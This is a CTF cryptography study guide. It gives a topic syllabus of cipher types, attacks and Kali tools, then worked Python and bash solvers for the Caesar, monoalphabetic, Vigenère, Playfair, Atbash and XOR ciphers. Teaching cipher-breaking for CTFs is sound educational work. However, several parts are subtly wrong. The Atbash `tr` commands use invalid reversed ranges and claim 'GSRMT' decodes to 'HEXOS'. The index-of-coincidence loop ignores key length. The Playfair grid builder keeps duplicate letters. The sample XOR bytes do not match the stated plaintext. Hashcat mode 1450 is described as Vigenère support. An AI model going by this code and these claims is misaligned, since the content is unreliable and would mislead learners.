# Syllabus

## Comprehensive Modular Topics Reference

---

## I. CLASSICAL CRYPTOGRAPHY

### A. Substitution Ciphers

- Caesar Cipher (ROT-N)
- Monoalphabetic Substitution
- Polyalphabetic Substitution (Vigenère)
- Playfair Cipher
- Atbash Cipher
- Simple XOR

### B. Transposition Ciphers

- Rail Fence Cipher
- Columnar Transposition
- Route Cipher
- Scytale Cipher

### C. Analysis & Attacks

- Frequency Analysis
- Caesar Brute Force
- Vigenère Key Length Detection (Kasiski, Index of Coincidence)
- Dictionary Attacks
- Known Plaintext Attacks

### D. Tools

- `hashcat`
- `john`
- `crunch`
- CyberChef (web)

---

## II. MODERN SYMMETRIC CRYPTOGRAPHY

### A. Stream Ciphers

- RC4 (Rivest Cipher 4)
- ChaCha20
- Linear Feedback Shift Registers (LFSR)
- One-Time Pad (OTP)
- Keystream Generation

### B. Block Ciphers

- DES (Data Encryption Standard)
- 3DES (Triple DES)
- AES (Advanced Encryption Standard)
- Blowfish
- Twofish
- IDEA (International Data Encryption Algorithm)

### C. Modes of Operation

- ECB (Electronic Codebook)
- CBC (Cipher Block Chaining)
- CTR (Counter)
- GCM (Galois/Counter Mode)
- CFB (Cipher Feedback)
- OFB (Output Feedback)

### D. Padding & Error Handling

- PKCS#7 Padding
- Padding Oracle Attacks
- CBC Bit Flipping
- Authentication Tag Validation

### E. Implementation Weaknesses

- Weak Key Schedules
- IV Reuse
- ECB Mode Patterns
- Nonce Reuse in GCM

### F. Tools

- `openssl enc`
- `gpg`
- `cryptool`
- `ccrypt`
- CyberChef
- `ffmpeg` (encrypted media)

---

## III. ASYMMETRIC CRYPTOGRAPHY

### A. RSA (Rivest-Shamir-Adleman)

- Key Generation
- Public/Private Key Pairs
- Encryption & Decryption
- Digital Signatures
- Small Exponent Attacks (e=3)
- Common Modulus Attack
- Hastad's Broadcast Attack
- Wiener's Attack
- Fermat Factorization
- Pollard's Rho Factorization

### B. Elliptic Curve Cryptography (ECC)

- ECDSA (Elliptic Curve Digital Signature Algorithm)
- ECDH (Elliptic Curve Diffie-Hellman)
- Curve25519
- secp256k1
- Point Doubling & Addition
- Invalid Curve Attacks
- Order Confusion
- Pohlig-Hellman Attack

### C. Diffie-Hellman & Variants

- Classic Diffie-Hellman
- ECDH
- Small Subgroup Confinement Attack
- Man-in-the-Middle Prevention

### D. ElGamal

- Encryption & Decryption
- Signature Scheme
- Malleability Issues

### E. Factorization & Discrete Log

- Trial Division
- Pollard's Rho
- Pollard's p-1
- Quadratic Sieve
- General Number Field Sieve (GNFS)
- Baby-step Giant-step
- Pollard's Lambda
- Index Calculus

### F. Tools

- `openssl genrsa`, `openssl rsa`
- `gpg`
- `ssh-keygen`
- `factordb` (online)
- RsaCtfTool
- `sageMath`
- `python-pycryptodome`
- `Cracking-RSA`

---

## IV. HASHING & MESSAGE AUTHENTICATION

### A. Hash Functions

- MD5 (broken)
- SHA-1 (deprecated)
- SHA-2 Family (SHA-256, SHA-512)
- SHA-3 (Keccak)
- BLAKE2
- RIPEMD
- Whirlpool
- Tiger

### B. Hash Attacks

- Brute Force & Dictionary Attacks
- Rainbow Tables
- Collision Attacks (MD5, SHA-1)
- Preimage Attacks
- Length Extension Attacks
- Timing Attacks

### C. Message Authentication Codes (MAC)

- HMAC (Hash-based MAC)
- CMAC (Cipher-based MAC)
- Poly1305
- CBC-MAC

### D. Key Derivation

- PBKDF2
- bcrypt
- scrypt
- Argon2

### E. Tools

- `hashcat`
- `john`
- `md5sum`, `sha256sum`
- `openssl dgst`
- `crunch`
- `rockyou.txt` wordlist
- Online databases (CrackStation, etc.)

---

## V. CRYPTANALYSIS TECHNIQUES

### A. Frequency Analysis

- Letter Frequency Distribution
- N-gram Analysis
- Chi-squared Test
- English Language Statistics

### B. Cryptographic Attacks Classification

- Ciphertext-Only
- Known Plaintext
- Chosen Plaintext
- Chosen Ciphertext
- Side-Channel (Timing, Power, Acoustic)

### C. Linear Cryptanalysis

- S-box Linear Approximations
- Piling-up Lemma

### D. Differential Cryptanalysis

- Difference Propagation
- Characteristic Analysis

### E. Meet-in-the-Middle Attack

- Double Encryption
- 3DES Vulnerability

### F. Statistical Analysis

- Entropy Calculation
- Randomness Testing
- Correlation Analysis

### G. Tools

- `binwalk` (hidden data)
- `xxd`, `hexdump` (hex analysis)
- CyberChef
- `strings` (embedded data)

---

## VI. STEGANOGRAPHY & COVERT CHANNELS

### A. Image Steganography

- LSB (Least Significant Bit) Insertion
- Spatial Domain Hiding
- Frequency Domain Hiding (DCT, DWT)
- JPEG Steganography

### B. Audio Steganography

- LSB Audio Hiding
- Spread Spectrum
- Echo Hiding

### C. Steganalysis

- Statistical Detection
- Signature Analysis
- Payload Estimation

### D. Tools

- `steghide`
- `stegcracker`
- `stegsolve`
- `binwalk`
- `zsteg` (PNG/BMP)
- `exiftool` (metadata)
- `jpegsnoop` (JPEG analysis)

---

## VII. DIGITAL SIGNATURES & CERTIFICATES

### A. Digital Signature Schemes

- RSA Signatures
- ECDSA
- DSA (Digital Signature Algorithm)
- EdDSA
- Blind Signatures
- Multisignatures

### B. PKI (Public Key Infrastructure)

- X.509 Certificates
- Certificate Chains
- Root Certificate Authorities
- Self-signed Certificates

### C. Certificate Attacks

- Signature Verification Bypass
- Self-signed Cert Spoofing
- Expired Certificate Misuse
- Weak Signature Algorithms

### D. Key Management

- Key Rotation
- Certificate Pinning
- Revocation (CRL, OCSP)

### E. Tools

- `openssl x509`
- `keytool` (Java)
- `gpg`
- `certutil` (Windows)
- Online certificate decoders

---

## VIII. ENCODING & OBFUSCATION

### A. Encoding Schemes

- Base64 / Base32 / Base16
- Hex Encoding
- URL Encoding
- ASCII/UTF-8
- Morse Code
- Bacon Cipher (5-bit)

### B. Obfuscation Methods

- Source Code Obfuscation
- Variable Name Mangling
- Control Flow Obfuscation
- String Obfuscation

### C. Compression

- GZIP, BZIP2, LZMA
- ZIP, RAR, 7z Compression
- Compression-based Attacks

### D. Tools

- CyberChef
- `base64` command
- `xxd` (hex)
- `strings` (encoded data recovery)
- `file` command (format detection)

---

## IX. PROTOCOL SECURITY

### A. TLS/SSL

- Protocol Versions (SSLv2, SSLv3, TLS 1.0-1.3)
- Cipher Suites
- Handshake Process
- Certificate Validation

### B. TLS Vulnerabilities

- HEARTBLEED
- POODLE
- BEAST
- Downgrade Attacks
- NULL Cipher Usage

### C. Authentication Protocols

- Kerberos
- OAuth 2.0 / OpenID Connect
- SAML
- HTTP Basic/Digest Auth

### D. Wireless Security

- WEP (Wired Equivalent Privacy) - Broken
- WPA/WPA2
- WPA3
- 4-way Handshake

### E. Tools

- `sslscan`
- `testssl.sh`
- `nmap --script ssl-*`
- `wireshark` (packet capture)
- `aircrack-ng` (wireless)

---

## X. SIDE-CHANNEL ATTACKS

### A. Timing Attacks

- Execution Time Variation
- Cache Timing
- Response Time Analysis

### B. Power Analysis

- Simple Power Analysis (SPA)
- Differential Power Analysis (DPA)
- Correlation Power Analysis (CPA)

### C. Acoustic Attacks

- CPU Sound Analysis
- Coil Whine Exploitation

### D. Electromagnetic Analysis

- EMI/EMF Emissions
- Tempest Attacks (passive eavesdropping)

### E. Fault Injection

- Bit Flipping Attacks
- Clock/Voltage Glitching
- Laser Fault Injection

---

## XI. IMPLEMENTATION FLAWS

### A. Common Vulnerabilities

- Weak RNG (Random Number Generation)
- Hardcoded Keys
- Predictable Nonces/IVs
- Improper Padding Validation
- Unvalidated Cryptographic Parameters

### B. Integer Arithmetic

- Integer Overflow/Underflow
- Modular Exponentiation Flaws

### C. Memory Management

- Key Material in Plaintext Memory
- Buffer Overflows Leaking Keys
- Use-After-Free in Crypto Operations

### D. Concurrency Issues

- TOCTOU (Time-of-Check Time-of-Use)
- Race Conditions in Key Generation

---

## XII. QUANTUM CRYPTOGRAPHY & POST-QUANTUM

### A. Quantum Computing Threats

- Shor's Algorithm (RSA/ECC Breaks)
- Grover's Algorithm (Symmetric Key Search)
- Timeline & Practicality

### B. Post-Quantum Cryptography

- Lattice-based (NTRU, Kyber)
- Code-based (McEliece)
- Multivariate Polynomial
- Hash-based Signatures (Merkle Tree)
- Isogeny-based

### C. Quantum Key Distribution (QKD)

- BB84 Protocol
- E91 Protocol
- Practical Implementations

---

## XIII. CTF-SPECIFIC TECHNIQUES

### A. Forensic Extraction

- Memory Dumps (Volatility)
- Disk Analysis (Foremost, Scalpel)
- Network Packet Analysis (PCAP)

### B. Reverse Engineering Crypto

- Binary Analysis (IDA, Ghidra, Radare2)
- Dynamic Analysis (GDB, ltrace, strace)
- Identifying Cipher Implementation
- Key Extraction from Binary

### C. Wordlist & Dictionary Generation

- `crunch` (custom generation)
- Common CTF wordlists
- Mutation Rules (hashcat)
- Context-based Word Generation

### D. Scripting & Automation

- Python crypto libraries (pycryptodome, cryptography)
- Automated attack chains
- Exploit framework (Metasploit)

### E. Online Resources & Tools

- CyberChef (cipher identification & decryption)
- Dcode.fr (classical ciphers)
- FactorDB (RSA factorization database)
- RsaCtfTool (RSA attacks automation)

---

## XIV. VULNERABILITY DATABASES & FRAMEWORKS

### A. Known Weaknesses

- CVE (Common Vulnerabilities & Exposures)
- NVD (National Vulnerability Database)
- NIST Cryptographic Standards

### B. Weak Cipher Collections

- Deprecated Algorithms Registry
- Published Attacks by Cipher Type

---

## XV. KALI LINUX TOOL ECOSYSTEM

### A. Pre-installed Cryptographic Tools

- `openssl`, `gpg`, `ssh-keygen`
- `hashcat`, `john`
- `aircrack-ng`

### B. Optional Installation

- `python3-pycryptodome`
- `sage` (mathematical computation)
- `ghidra`, `radare2` (reverse engineering)
- `wireshark`, `tcpdump` (network analysis)
- `volatility` (memory forensics)

### C. Custom Script Development

- Bash scripting for automation
- Python for cryptanalysis
- Ruby/Perl for text processing

---

## XVI. COMMON CTF CIPHER SCENARIOS

### A. Mystery Ciphers

- Identify-then-Break approach
- Visual pattern recognition
- Frequency distribution hints

### B. Combined Techniques

- Encoding + Encryption (multiple layers)
- Steganography + Cryptography
- Custom Cipher Variants

### C. Key Recovery Challenges

- Partial key information
- Brute-force keyspace reduction
- Pattern-based key inference

### D. Practical CTF Patterns

- ROT-N variants
- Base64 + Cipher chains
- Metadata hiding (EXIF, ZIP comments)
- PNG/image corruption
- Modified algorithm parameters

---

## XVII. MATHEMATICAL FOUNDATIONS (REFERENCE)

### A. Number Theory Basics

- Modular Arithmetic
- Prime Numbers & Primality Testing
- Euler's Totient Function
- Extended Euclidean Algorithm
- Chinese Remainder Theorem

### B. Group Theory & Finite Fields

- Groups, Rings, Fields
- Galois Fields (GF)
- Generator Elements
- Order & Subgroups

### C. Elliptic Curves

- Curve Equations (Weierstrass, Montgomery)
- Point Operations
- Scalar Multiplication
- Order of Curve

---

## XVIII. DOCUMENTATION & REFERENCE

### A. Standards

- FIPS (Federal Information Processing Standards)
- NIST SP 800 Series
- RFC Specifications (TLS, SSH, OpenPGP)

### B. Algorithm Specifications

- Peer-reviewed cryptographic papers
- Published attack proofs

---

**Note:** This syllabus is modular—CTF challenges may combine multiple topics from different sections. Prioritize based on challenge context.

---

# CLASSICAL CRYPTOGRAPHY

## Substitution Ciphers

### Caesar Cipher (ROT-N)

The Caesar cipher shifts each letter in the plaintext by a fixed number of positions in the alphabet. With only 25 possible shifts (ROT-1 through ROT-25), it is trivially vulnerable to brute-force attacks in CTF contexts.

#### Recognition and Analysis

Caesar ciphers typically appear as ciphertext where letter frequency distribution remains similar to English (or the source language). Identify them by attempting all 25 rotations and checking for readable plaintext or known keywords.

#### Tools and Commands

**Using `rot13` utility (common for ROT-13):**

```bash
echo "Uryyb Jbeyq" | rot13
```

**Using `tr` for arbitrary rotation:**

```bash
# ROT-5 example
echo "Mjqqt Btwqi" | tr 'a-zA-Z' 'f-za-eF-ZA-E'
```

For ROT-N where N is variable, construct the transformation dynamically:

```bash
# ROT-7 (shift forward 7 positions)
echo "Ciphertext here" | tr 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ' 'hijklmnopqrstuvwxyzabcdefgHIJKLMNOPQRSTUVWXYZABCDEF'
```

**Using Python for brute-force all rotations:**

```python
def caesar_bruteforce(ciphertext):
    for rotation in range(26):
        result = ""
        for char in ciphertext:
            if char.isalpha():
                base = ord('A') if char.isupper() else ord('a')
                result += chr((ord(char) - base + rotation) % 26 + base)
            else:
                result += char
        print(f"ROT-{rotation}: {result}")

caesar_bruteforce("Uryyb Jbeyq")
```

**Using `hashcat` or online tools:** Many CTF platforms have web interfaces for Caesar decryption, but command-line approaches are more reliable:

```bash
# Manual verification with grep (check if output contains English words)
for i in {0..25}; do echo "ROT-$i: $(echo 'CIPHERTEXT' | tr 'A-Za-z' "$(echo {N..Z} {A..M})")"; done | grep -i "english\|word\|the"
```

#### Frequency Analysis

Analyze letter frequency to confirm Caesar cipher:

```bash
# Generate frequency analysis
echo "Your ciphertext here" | tr -cd 'a-zA-Z' | tr '[:upper:]' '[:lower:]' | grep -o . | sort | uniq -c | sort -rn
```

Compare the frequency distribution against expected English letter frequencies. In a Caesar cipher, the distribution shape remains unchanged—only shifted.

#### CTF Exploitation Strategy

1. **Attempt all 26 rotations immediately** using brute-force scripts.
2. **Look for context clues**: If the challenge mentions "rotation," "shift," or "classic cipher," Caesar is likely.
3. **Check for known plaintext**: If you have partial cleartext, determine the shift value and apply universally.
4. **Verify with word lists**: Use `grep` against `/usr/share/dict/words` or similar wordlists to confirm English output.

---

### Monoalphabetic Substitution

Monoalphabetic substitution replaces each letter with another letter consistently throughout the ciphertext. Unlike Caesar, the substitution mapping is arbitrary (not positional), creating 26! possible keys—computationally infeasible to brute-force directly.

#### Recognition and Analysis

Monoalphabetic ciphers have consistent letter-to-letter mappings but appear as random letter substitutions. Frequency analysis is the primary attack vector.

#### Frequency Analysis Method

English letter frequencies (approximate): E(12.7%), T(9.1%), A(8.2%), O(7.5%), I(7.0%), N(6.7%), S(6.3%), H(6.1%)...

```bash
# Detailed frequency analysis
python3 << 'EOF'
from collections import Counter
import sys

ciphertext = "your ciphertext here"
letters = [c for c in ciphertext.lower() if c.isalpha()]
freq = Counter(letters)

print("Letter frequencies:")
for letter, count in freq.most_common(26):
    percentage = (count / len(letters)) * 100
    print(f"{letter}: {count} ({percentage:.2f}%)")
EOF
```

#### Tools for Monoalphabetic Attacks

**Using `quipqiup` (online frequency analysis solver):** Many CTFs allow web access. The tool analyzes frequency patterns and suggests probable substitutions based on English language models.

**Manual substitution mapping with Python:**

```python
def monoalphabetic_decrypt(ciphertext, mapping):
    """
    mapping: dictionary {'A': 'E', 'B': 'T', ...}
    """
    result = ""
    for char in ciphertext:
        if char.upper() in mapping:
            result += mapping[char.upper()] if char.isupper() else mapping[char.upper()].lower()
        else:
            result += char
    return result

# Start with high-frequency letter mapping (E→most common, T→second, etc.)
mapping = {
    'A': 'E',  # Most common ciphertext letter maps to E
    'B': 'T',  # Second most common to T
    # ... continue based on frequency analysis
}

print(monoalphabetic_decrypt("YOUR CIPHERTEXT", mapping))
```

**Automated solving with `bombe`-style approach (pattern matching):**

[Unverified] Many online tools and CTF-specific scripts use Bayesian frequency analysis and dictionary matching to propose substitutions iteratively. The effectiveness depends on ciphertext length and dictionary quality.

```bash
# Using a CTF tool (if available in your environment)
echo "Ciphertext here" | substitution_solver
```

#### Hill Climbing / Genetic Algorithm Approach

For medium-length ciphertexts, automated solvers using hill-climbing on English language models are effective:

```python
import random
from collections import Counter

def fitness(text, english_freq):
    """Score based on English letter frequency similarity"""
    letters = [c.lower() for c in text if c.isalpha()]
    if not letters:
        return 0
    freq = Counter(letters)
    score = 0
    for letter, expected_freq in english_freq.items():
        actual = (freq.get(letter, 0) / len(letters)) * 100
        score -= abs(actual - expected_freq)
    return score

# English frequency (simplified)
english_freq = {'e': 12.7, 't': 9.1, 'a': 8.2, 'o': 7.5, 'i': 7.0, 'n': 6.7, 's': 6.3}

def generate_random_key():
    letters = list("abcdefghijklmnopqrstuvwxyz")
    random.shuffle(letters)
    return dict(zip("abcdefghijklmnopqrstuvwxyz", letters))

# Hill-climbing solver (simplified version)
best_key = generate_random_key()
best_fitness = fitness("ciphertext", english_freq)

for iteration in range(10000):
    new_key = best_key.copy()
    # Swap two random letters
    l1, l2 = random.sample(best_key.keys(), 2)
    new_key[l1], new_key[l2] = new_key[l2], new_key[l1]
    
    decrypted = ''.join(new_key.get(c, c) for c in "ciphertext")
    new_fitness = fitness(decrypted, english_freq)
    
    if new_fitness > best_fitness:
        best_key = new_key
        best_fitness = new_fitness

print(f"Best key: {best_key}")
```

#### CTF Exploitation Strategy

1. **Extract ciphertext and perform frequency analysis** to identify most common letters.
2. **Map high-frequency ciphertext letters to high-frequency English letters** (E, T, A, O).
3. **Look for patterns**: Single-letter words are likely "A" or "I"; common two-letter words are "THE", "AND", "OF", etc.
4. **Use online tools** like quipqiup or automated solvers if available.
5. **Refine iteratively**: Adjust mappings based on partial plaintext visibility.
6. **Verify against wordlists** to confirm accuracy.

---

### Polyalphabetic Substitution (Vigenère Cipher)

The Vigenère cipher uses a repeating keyword to shift each letter by a different amount, eliminating simple frequency analysis. It appears as relatively uniform letter distribution compared to monoalphabetic ciphers.

#### Recognition and Analysis

Vigenère ciphers are identifiable by:

- Relatively flat frequency distribution (no single dominant letter).
- Repetition patterns in the ciphertext if the keyword is short and repeated.
- Context clues: "key," "passphrase," or "keyword" mentioned in challenge descriptions.

#### Determining Key Length

**Kasiski Examination:**

Find repeated sequences in the ciphertext. The distances between these sequences are likely multiples of the keyword length.

```python
def kasiski_examination(ciphertext):
    """Find repeated trigrams and their distances"""
    ciphertext = ciphertext.upper()
    trigrams = {}
    
    for i in range(len(ciphertext) - 2):
        trigram = ciphertext[i:i+3]
        if trigram not in trigrams:
            trigrams[trigram] = []
        trigrams[trigram].append(i)
    
    print("Repeated trigrams and positions:")
    for trigram, positions in trigrams.items():
        if len(positions) > 1:
            distances = [positions[i+1] - positions[i] for i in range(len(positions)-1)]
            print(f"{trigram}: positions {positions}, distances {distances}")
            
            # Find GCD of distances (likely key length divisor)
            from math import gcd
            from functools import reduce
            key_divisor = reduce(gcd, distances)
            print(f"  Possible key length divisor: {key_divisor}")

kasiski_examination("YOUR VIGENERE CIPHERTEXT")
```

**Index of Coincidence (IC):**

The IC measures randomness. English text has IC ≈ 0.067; random text ≈ 0.038.

```python
def index_of_coincidence(text):
    """Calculate IC to estimate key length"""
    text = text.upper()
    letters_only = [c for c in text if c.isalpha()]
    n = len(letters_only)
    
    from collections import Counter
    freq = Counter(letters_only)
    
    ic = sum(freq[letter] * (freq[letter] - 1) for letter in freq) / (n * (n - 1))
    return ic

# Test various key lengths
text = "YOUR CIPHERTEXT"
for key_length in range(1, 21):
    ic = index_of_coincidence(text)
    print(f"Key length {key_length}: IC = {ic:.4f}")
    # IC close to 0.067 suggests English plaintext (correct key length)
```

#### Breaking the Vigenère Cipher

Once key length is determined (e.g., 4), split the ciphertext into N columns and solve each as a Caesar cipher.

```python
def break_vigenere(ciphertext, key_length):
    """Break Vigenère by treating each position as Caesar cipher"""
    ciphertext = ciphertext.upper()
    ciphertext_clean = ''.join(c for c in ciphertext if c.isalpha())
    
    columns = [[] for _ in range(key_length)]
    for i, char in enumerate(ciphertext_clean):
        columns[i % key_length].append(char)
    
    key = ""
    for col_index, column in enumerate(columns):
        # Frequency analysis on this column
        from collections import Counter
        freq = Counter(column)
        most_common = freq.most_common(1)[0][0]
        
        # Assume most common letter is 'E' (or analyze further)
        shift = (ord(most_common) - ord('E')) % 26
        key_char = chr(shift + ord('A'))
        key += key_char
        
        print(f"Column {col_index}: {column[:10]}... → Key char: {key_char}")
    
    print(f"Likely key: {key}")
    return key

# Decrypt with known key
def vigenere_decrypt(ciphertext, key):
    result = ""
    key_index = 0
    for char in ciphertext:
        if char.isalpha():
            shift = ord(key[key_index % len(key)]) - ord('A')
            if char.isupper():
                result += chr((ord(char) - ord('A') - shift) % 26 + ord('A'))
            else:
                result += chr((ord(char) - ord('a') - shift) % 26 + ord('a'))
            key_index += 1
        else:
            result += char
    return result

plaintext = vigenere_decrypt("CIPHERTEXT HERE", "KEYHERE")
print(plaintext)
```

#### Tools for Vigenère Attacks

**`hashcat` with Vigenère support (if available):**

```bash
hashcat -m 1450 encrypted.txt wordlist.txt  # [Unverified] - mode may vary by hashcat version
```

**Online tools:** Many CTF platforms provide web-based Vigenère solvers that automate key recovery.

#### CTF Exploitation Strategy

1. **Calculate Kasiski distances** to estimate key length.
2. **Verify with Index of Coincidence** if multiple key lengths are possible.
3. **Split ciphertext into columns** based on key length.
4. **Apply Caesar brute-force to each column** to recover key characters.
5. **Decrypt with recovered key** and verify plaintext against wordlists.
6. **Refine if needed**: If partial decryption is readable but not perfect, adjust key characters iteratively.

---

### Playfair Cipher

The Playfair cipher uses a 5×5 grid of letters and encrypts plaintext in digraphs (pairs). It is more resistant than monoalphabetic substitution but weaker than polyalphabetic ciphers.

#### Cipher Mechanics

1. **Key Setup**: Arrange a keyword in a 5×5 grid, filling remaining cells with unused letters.
2. **Encryption Rules**:
    - If pair is in the same row: shift each letter right (wrap to start).
    - If pair is in the same column: shift each letter down (wrap to top).
    - If pair forms a rectangle: swap with letters in opposite corners of the rectangle.

#### Recognition

Playfair ciphertexts are digraphs without repeated consecutive letters (e.g., "HELLO" → "HE LL O" is padded to avoid double L). The ciphertext length is always even.

#### Attack Methods

**Frequency Analysis on Digraphs:**

Playfair's digraph distribution differs from English. Analyze digraph frequencies to constrain the key space.

```python
def analyze_digraphs(ciphertext):
    """Analyze digraph frequency"""
    ciphertext = ciphertext.upper()
    letters_only = ''.join(c for c in ciphertext if c.isalpha())
    
    from collections import Counter
    digraphs = Counter(letters_only[i:i+2] for i in range(0, len(letters_only)-1, 2))
    
    print("Most common digraphs:")
    for digraph, count in digraphs.most_common(10):
        print(f"{digraph}: {count}")

analyze_digraphs("CIPHERTEXT HERE")
```

**Known-Plaintext Attack:**

If you know part of the plaintext, you can deduce key positions:

```python
def playfair_known_plaintext(plaintext_part, ciphertext_part):
    """
    Determine key grid positions from known plaintext-ciphertext pair
    """
    print(f"Plaintext:  {plaintext_part}")
    print(f"Ciphertext: {ciphertext_part}")
    print("Analyze positions to deduce key relationships...")
    # Manual analysis required; Playfair relationships constrain key space
```

**Brute-Force with Dictionary:**

[Inference] Playfair key space is large (~26! for the grid), but many CTF challenges use dictionary words as keys. Brute-force against a wordlist.

```bash
# Attempt to crack with rockyou.txt or similar
for keyword in $(cat wordlist.txt); do
    echo "Trying: $keyword"
    # Use Playfair decryption tool with this keyword
    playfair_decrypt "$ciphertext" "$keyword" | grep -i "the\|and\|flag"
done
```

#### Playfair Decryption Tools

**Python implementation:**

```python
def playfair_grid(keyword):
    """Generate Playfair grid from keyword"""
    keyword = keyword.upper().replace('J', 'I')
    grid = []
    used = set(keyword)
    
    # Add keyword letters
    for char in keyword:
        if char not in used or char == keyword[keyword.index(char)]:
            grid.append(char)
            used.add(char)
    
    # Add remaining alphabet (J omitted)
    for char in "ABCDEFGHIKLMNOPQRSTUVWXYZ":
        if char not in used:
            grid.append(char)
    
    return [grid[i:i+5] for i in range(0, 25, 5)]

def playfair_decrypt(ciphertext, keyword):
    """Decrypt Playfair ciphertext"""
    grid = playfair_grid(keyword)
    grid_map = {grid[i][j]: (i, j) for i in range(5) for j in range(5)}
    
    ciphertext = ciphertext.upper().replace('J', 'I')
    ciphertext_clean = ''.join(c for c in ciphertext if c.isalpha())
    
    plaintext = ""
    for i in range(0, len(ciphertext_clean), 2):
        c1, c2 = ciphertext_clean[i], ciphertext_clean[i+1]
        r1, col1 = grid_map[c1]
        r2, col2 = grid_map[c2]
        
        if r1 == r2:  # Same row
            plaintext += grid[r1][(col1 - 1) % 5] + grid[r2][(col2 - 1) % 5]
        elif col1 == col2:  # Same column
            plaintext += grid[(r1 - 1) % 5][col1] + grid[(r2 - 1) % 5][col2]
        else:  # Rectangle
            plaintext += grid[r1][col2] + grid[r2][col1]
    
    return plaintext

print(playfair_decrypt("CIPHERTEXT", "KEYWORD"))
```

#### CTF Exploitation Strategy

1. **Recognize Playfair by digraph patterns** and even ciphertext length.
2. **Analyze digraph frequencies** for constraints.
3. **Attempt dictionary brute-force** with common keywords.
4. **Use known-plaintext attacks** if partial cleartext is available (e.g., "FLAG{").
5. **Online tools**: Many Playfair solvers are available online; verify results manually.

---

### Atbash Cipher

The Atbash cipher maps each letter to its reverse in the alphabet: A↔Z, B↔Y, C↔X, etc. It is trivial to break (only one transformation) but common in CTF as an obfuscation layer.

#### Mechanics

Atbash is its own inverse: applying it twice recovers the original plaintext.

**Transformation:** A→Z, B→Y, C→X, D→W, E→V, ... Z→A

#### Recognition

Look for reversed alphabet patterns or challenges mentioning "reverse" or "mirror."

#### Decryption

```bash
# Using tr
echo "Ciphertext" | tr 'a-zA-Z' 'z-aZ-A'

# Atbash is symmetric, so encryption = decryption
echo "GSRMT" | tr 'A-Z' 'Z-A'  # Outputs: HEXOS or similar
```

**Python:**

```python
def atbash(text):
    result = ""
    for char in text:
        if char.isalpha():
            if char.isupper():
                result += chr(ord('Z') - (ord(char) - ord('A')))
            else:
                result += chr(ord('z') - (ord(char) - ord('a')))
        else:
            result += char
    return result

ciphertext = "GSRMT"
print(atbash(ciphertext))  # Decrypts immediately
```

#### CTF Exploitation Strategy

1. **Apply Atbash transformation** once to recover plaintext.
2. **Verify** the result is readable English.
3. **Recognize as an obfuscation layer** in multi-stage challenges.

---

### Simple XOR

XOR (exclusive OR) is a bitwise operation: `a XOR b = c` where `c` has a 1 bit wherever `a` and `b` differ. XOR is symmetric: `c XOR b = a`, allowing single-pass encryption/decryption.

#### Mechanics

Each byte of plaintext is XORed with a corresponding byte of the key. With a repeating key, position modulo key length determines the key byte used.

**Example:**

```
Plaintext:  H     e     l     l     o
ASCII:      72    101   108   108   111
Key:        K (75)

72 XOR 75 = 0x48 XOR 0x4B = 0x03
101 XOR 75 = 0x65 XOR 0x4B = 0x2E
...
```

#### Encryption / Decryption

**Python (single-byte key):**

```python
def xor_encrypt(plaintext, key):
    key_byte = ord(key) if isinstance(key, str) else key
    return ''.join(chr(ord(c) ^ key_byte) for c in plaintext)

def xor_decrypt(ciphertext, key):
    # XOR is symmetric
    return xor_encrypt(ciphertext, key)

plaintext = "Hello"
key = "K"
cipher = xor_encrypt(plaintext, key)
print(f"Encrypted: {repr(cipher)}")
print(f"Decrypted: {xor_decrypt(cipher, key)}")
```

**Python (repeating key):**

```python
def xor_encrypt_key(plaintext, key):
    return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(plaintext))

def xor_decrypt_key(ciphertext, key):
    return xor_encrypt_key(ciphertext, key)

plaintext = "Hello World"
key = "SECRET"
cipher = xor_encrypt_key(plaintext, key)
print(f"Encrypted: {repr(cipher)}")
print(f"Decrypted: {xor_decrypt_key(cipher, key)}")
```

**Bash (using xxd and bc):**

```bash
# Encrypt with XOR
echo -n "Hello" | xxd -p | tr -d '\n' | \
  while IFS= read -r -n2 byte; do
    printf '%x\n' $((0x$byte ^ 0x4B))  # 0x4B is 'K'
  done | xxd -r -p
```

#### Key Recovery Attacks

**Single-Byte XOR Brute-Force:**

Since there are only 256 possible byte values, brute-force all:

```python
def brute_force_single_xor(ciphertext):
    for key_byte in range(256):
        plaintext = ''.join(chr(ord(c) ^ key_byte) for c in ciphertext)
        if all(c.isprintable() or c.isspace() for c in plaintext):
            print(f"Key: {key_byte} ({chr(key_byte)})")
            print(f"Plaintext: {plaintext}\n")

ciphertext = "\x0e\x2a\x2b\x2b\x2e"  # "Hello" XORed with 'K'
brute_force_single_xor(ciphertext)
```

**Multi-Byte Key Recovery (Known-Plaintext):**

If you know part of the plaintext:

```python
def recover_xor_key(plaintext_known, ciphertext_known):
    """Recover key bytes from known plaintext-ciphertext pair"""
    key = []
    for i in range(len(plaintext_known)):
        key_byte = ord(plaintext_known[i]) ^ ord(ciphertext_known[i])
        key.append(chr(key_byte))
    return ''.join(key)

known_plain = "FLAG"
known_cipher = "\x0F\x1A\x0C\x0E"  # Hypothetical
key = recover_xor_key(known_plain, known_cipher)
print(f"Recovered key: {repr(key)}")
```

**Frequency Analysis on XOR Output:**

If the key is short (repeating), XOR preserves frequency patterns modulo the key length. Analyze by position:

```python
def analyze_xor_frequency(ciphertext, key_length):
    """Analyze frequency at each key position"""
    columns = [[] for _ in range(key_length)]
    for i, char in enumerate(ciphertext):
        columns[i % key_length].append(char)
    
    for col_index, column in enumerate(columns):
        from collections import Counter
        freq = Counter(column)
        print(f"Position {col_index}: {freq.most_common(5)}")
        # Most common byte in each position likely corresponds to 'E' or 'T' in plaintext

analyze_xor_frequency(b"ciphertext_bytes", key_length=4)
```

#### Tools for XOR

**`xortool` (Kali Linux):**

```bash
# Single-byte XOR brute-force
xortool -b input_file

# Multi-byte XOR with known plaintext
xortool -b -p "known_text" input_file

# Guess key length from repeating key XOR
xortool -l input_file
```

**Python one-liners:**

```bash
python3 -c "
import sys
data = open(sys.argv[1], 'rb').read()
for key in range(256):
    try:
        print(f'Key {key}: {bytes(b ^ key for b in data)}')
    except:
        pass
" input_file
```

#### CTF Exploitation Strategy

1. **Recognize XOR by attempts**: Single-byte XOR can be brute-forced immediately (256 attempts).
2. **Use `xortool` for automated analysis** of multi-byte repeating keys.
3. **Apply known-plaintext attacks** if challenge format is known (e.g., "flag{...}").
4. **Analyze byte frequency** at each position for key length hints.
5. **Verify output** against printable ASCII or known keyword patterns.

---

## Transposition Ciphers

